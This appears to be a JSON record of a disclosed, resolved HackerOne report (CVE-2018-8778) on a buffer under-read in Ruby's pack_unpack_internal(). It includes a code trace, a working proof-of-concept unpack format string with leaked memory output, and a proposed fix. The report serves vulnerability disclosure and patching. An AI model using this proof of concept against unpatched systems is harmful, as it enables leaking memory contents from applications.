@@ -1,0 +1,133 @@
+{
+  "id": 298246,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTgyNDY=",
+  "url": "https://hackerone.com/reports/298246",
+  "title": "controlled buffer under-read in pack_unpack_internal()",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-15T12:21:22.135Z",
+  "submitted_at": "2017-12-15T12:21:22.135Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "aerodudrizzt",
+    "url": "/aerodudrizzt",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-8778"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-30T08:40:13.042Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-03-30T08:40:12.955Z",
+  "team_member_agreed_on_going_public_at": "2018-03-30T02:01:21.786Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Brief\n-----\nThere is a signedness error in the pack_unpack_internal(), allowing the '@' type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).\n\nCode Vulnerability\n--------------------\n**Vulnerable version:** 2.5.0 (rc) and prior (tested also on 2.3.3)\n**Scope:** works on 32 bit and 64 bit versions\n**File:** pack.c\n**Function:** pack_unpack_internal()\n**Code Trace:**\n1. *len* is a **signed** long: \n\n    ```ruby\n        long len;\n    ```\n1. *len* can be parsed using a decimal string representation, to hold **any** unsigned long value\n\n    ```ruby\n    ...\n\telse if (ISDIGIT(*p)) {\n\t    errno = 0;\n\t\tlen = STRTOUL(p, (char**)&p, 10);\n\t    if (errno) {\n\t\trb_raise(rb_eRangeError, \"pack length too big\");\n\t    }\n\t}\n    ...\n    ```\n1. Using a **negative** *len* value, the '@' type will move the string backwards:\n\n    ```ruby\n    ...\n\tcase '@':\n        // EI - Trace: negative length will pass this check\n\t    if (len > RSTRING_LEN(str))\n\t\t  rb_raise(rb_eArgError, \"@ outside of string\");\n         // EI - Trace: negative length will move s backwards\n\t    s = RSTRING_PTR(str) + len;\n\t    break;\n    ...\n    ```\n1. Later unpacking will parse memory data before the buffer's start\n\nPoC Script\n------------\nThe script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).\n\n```ruby\nputs 'Version: ' + RUBY_VERSION\nputs 2 ** 32 - 100\n\nputs '**********************************'\nputs 'Expected:'\n\"0123456789\".unpack(\"C10\").each { |x| puts x.to_s(16) }\n\nputs '**********************************'\nputs 'Leaked + Expected:'\n\"0123456789\".unpack(\"@4294967196C110\").each { |x| puts x.to_s(16) }\nputs '**********************************'\n```\n\n**Output:**\n\n```\nVersion: 2.5.0\n4294967196\n**********************************\nExpected:\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\nLeaked + Expected:\n28\n13\ne2\n1\nc1\n24\n0\n0\n40\n43\ndf\n1\n65\n48\n92\n20\n3c\n7e\ndf\n1\n72\n65\n6d\n61\n69\n6e\n64\n65\n72\n0\n0\n0\n7a\n60\n1\n0\n30\n1\nf5\n1\n50\nc5\nef\n1\n7f\na3\n0\n0\n30\n1\nf5\n1\n7a\n60\n5\n0\n40\n43\ndf\n1\n8\n13\ne2\n1\nb1\n24\n0\n0\n40\n43\ndf\n1\n65\n88\n91\n20\n3c\n7e\ndf\n1\n6d\n6f\n64\n75\n6c\n6f\n0\n0\n0\n0\n0\n0\n5\n80\n52\n0\n3c\n7e\ndf\n1\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\n```\n\nProposed Fix:\n---------------\n*len* should be limited to hold only positive values, and it should be enforced right after *len* is parsed. A different fix could be to specifically check if *len* is negative in all dangerous places in the unpack() function.\n\n## Impact\n\nImpact\n--------\nAn attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a **massive and controlled** information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.\n\nThis vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.",
+  "weakness": {
+    "id": 10,
+    "name": "Buffer Under-read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-04-29T02:01:21.905Z",
+  "allow_singular_disclosure_after": -252781680.56591848,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "muon4",
+    "miquinho",
+    "apapedulimu",
+    "bobo_ka",
+    "cuso4",
+    "akaash_pantherdefence",
+    "eveeez",
+    "0x08",
+    "abdullahzk",
+    "arielmarlon",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
